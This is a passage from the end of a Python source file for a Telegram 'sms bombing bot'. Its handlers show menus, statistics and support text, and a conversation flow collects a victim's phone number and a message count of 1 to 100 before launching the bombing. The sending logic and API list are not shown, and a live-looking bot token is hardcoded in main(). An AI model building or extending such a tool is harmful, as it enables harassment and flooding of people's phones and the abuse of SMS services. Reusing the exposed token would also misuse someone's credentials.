👥 *𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐈𝐒𝐓𝐈𝐂𝐒*

📊 *𝐆𝐋𝐎𝐁𝐀𝐋 𝐒𝐓𝐀𝐓𝐒:*
━━━━━━━━━━━━━━━━━━━━━━
• 👥 Total Users: `{total_users_count}`
• 📤 Total Requests: `{total_requests_count}`
• 🔥 Active APIs: `{len(ALL_APIS)}`

⚡ *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎:*
━━━━━━━━━━━━━━━━━━━━━━
• 🤖 Bot Name: {BOT_NAME}
• 🚀 Version: Premium v1.0
• 📡 Status: 🟢 𝐎𝐍𝐋𝐈𝐍𝐄
• ⚙️ Server: 🟢 𝐑𝐔𝐍𝐍𝐈𝐍𝐆

💪 Thanks for using sk sms bombing bot!
    """
    
    update.message.reply_text(
        users_text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=get_main_menu_keyboard()
    )

def bot_info_command(update, context):
    """Show bot information"""
    info_text = f"""
⚡ *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍*

🤖 *𝐁𝐎𝐓 𝐃𝐄𝐓𝐀𝐈𝐋𝐒:*
━━━━━━━━━━━━━━━━━━━━━━
• Name: {BOT_NAME}
• Version: Premium v1.0
• APIs: {len(ALL_APIS)} Active Services
• Developer: {DEVELOPER}
• Platform: Telegram Bot

🎯 *𝐅𝐄𝐀𝐓𝐔𝐑𝐄𝐒:*
━━━━━━━━━━━━━━━━━━━━━━
• ✅ {len(ALL_APIS)} Active APIs
• ⚡ Multi-threaded
• 🎯 High Accuracy
• 🔄 Fast Processing

📢 *𝐂𝐇𝐀𝐍𝐍𝐄𝐋𝐒:*
━━━━━━━━━━━━━━━━━━━━━━
• Updates: {CHANNEL_USERNAME}
• Support: {SUPPORT_USERNAME}

⚠️ *𝐃𝐈𝐒𝐂𝐋𝐀𝐈𝐌𝐄𝐑:*
━━━━━━━━━━━━━━━━━━━━━━
Use responsibly and ethically.
    """
    
    update.message.reply_text(
        info_text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=get_main_menu_keyboard()
    )

def join_channel_command(update, context):
    
    keyboard = [
        [InlineKeyboardButton("📢 𝐉𝐎𝐈𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")],
        [InlineKeyboardButton("✅ 𝐈'𝐕𝐄 𝐉𝐎𝐈𝐍𝐄𝐃", callback_data="check_join")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    update.message.reply_text(
        f"""
📢 *𝐉𝐎𝐈𝐍 𝐎𝐔𝐑 𝐂𝐇𝐀𝐍𝐍𝐄𝐋*

To use this bot, you must join our channel:
{CHANNEL_USERNAME}

After joining, click *✅ 𝐈'𝐕𝐄 𝐉𝐎𝐈𝐍𝐄𝐃*
        """,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

def support_command(update, context):
    """Support command"""
    support_text = f"""
🆘 *𝐒𝐔𝐏𝐏𝐎𝐑𝐓 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍*

📞 *𝐂𝐎𝐍𝐓𝐀𝐂𝐓:*
━━━━━━━━━━━━━━━━━━━━━━
• Support: {SUPPORT_USERNAME}
• Channel: {CHANNEL_USERNAME}
• Developer: {DEVELOPER}

🔧 *𝐖𝐄 𝐂𝐀𝐍 𝐇𝐄𝐋𝐏 𝐖𝐈𝐓𝐇:*
━━━━━━━━━━━━━━━━━━━━━━
• Bot usage issues
• Error reports
• Feature requests
• General questions

⚡ *𝐐𝐔𝐈𝐂𝐊 𝐓𝐈𝐏𝐒:*
━━━━━━━━━━━━━━━━━━━━━━
• Use format: 01XXXXXXXXX
• Amount between 1-100
• Join channel for updates

🚀 *𝐖𝐄'𝐑𝐄 𝐇𝐄𝐑𝐄 𝐓𝐎 𝐇𝐄𝐋𝐏!*
    """
    
    update.message.reply_text(
        support_text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=get_main_menu_keyboard()
    )

def back_to_main(update, context):

    return start_command(update, context)

def handle_text(update, context):
    
    text = update.message.text
    
    if text == "🚀 𝐒𝐓𝐀𝐑𝐓 𝐁𝐎𝐌𝐁𝐈𝐍𝐆":
        return start_bombing(update, context)
    elif text == "📊 𝐌𝐘 𝐒𝐓𝐀𝐓𝐒":
        my_stats_command(update, context)
    elif text == "👥 𝐓𝐎𝐓𝐀𝐋 𝐔𝐒𝐄𝐑𝐒":
        total_users_command(update, context)
    elif text == "⚡ 𝐁𝐎𝐓 𝐈𝐍𝐅𝐎":
        bot_info_command(update, context)
    elif text == "📢 𝐉𝐎𝐈𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋":
        join_channel_command(update, context)
    elif text == "🆘 𝐒𝐔𝐏𝐏𝐎𝐑𝐓":
        support_command(update, context)
    elif text == "🔙 𝐁𝐀𝐂𝐊 𝐓𝐎 𝐌𝐀𝐈𝐍":
        back_to_main(update, context)
    else:
        update.message.reply_text(
            "❌ Unknown command. Please use the buttons below.",
            reply_markup=get_main_menu_keyboard()
        )


def main():
    """Main function"""
    # Initialize database
    init_db()
    
    
    TOKEN = "8435339480:AAFa-3VtTXK77sN0_zTlTSuC5pHlMOTJp10"
    
    
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher
    
    
    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler('start', start_command),
            MessageHandler(Filters.regex('^🚀 𝐒𝐓𝐀𝐑𝐓 𝐁𝐎𝐌𝐁𝐈𝐍𝐆$'), start_bombing)
        ],
        states={
            PHONE: [MessageHandler(Filters.text & ~Filters.command, get_phone_number)],
            AMOUNT: [MessageHandler(Filters.text & ~Filters.command, get_amount)],
            CONFIRM: [CallbackQueryHandler(button_handler)]
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )
    
    
    dp.add_handler(conv_handler)
    dp.add_handler(CallbackQueryHandler(button_handler, pattern='^(check_join|confirm_start|cancel_bomb)$'))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_text))
    
    
    dp.add_handler(CommandHandler('stats', my_stats_command))
    dp.add_handler(CommandHandler('users', total_users_command))
    dp.add_handler(CommandHandler('info', bot_info_command))
    dp.add_handler(CommandHandler('support', support_command))
    dp.add_handler(CommandHandler('channel', join_channel_command))
    
    
    print("=" * 60)
    print(f"🤖 {BOT_NAME}")
    print("=" * 60)
    print(f"📡 Loaded {len(ALL_APIS)} APIs")
    print(f"💾 Database initialized")
    print(f"⚡ Optimized for speed and reliability")
    print(f"🚀 Bot is running...")
    print("=" * 60)
    
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()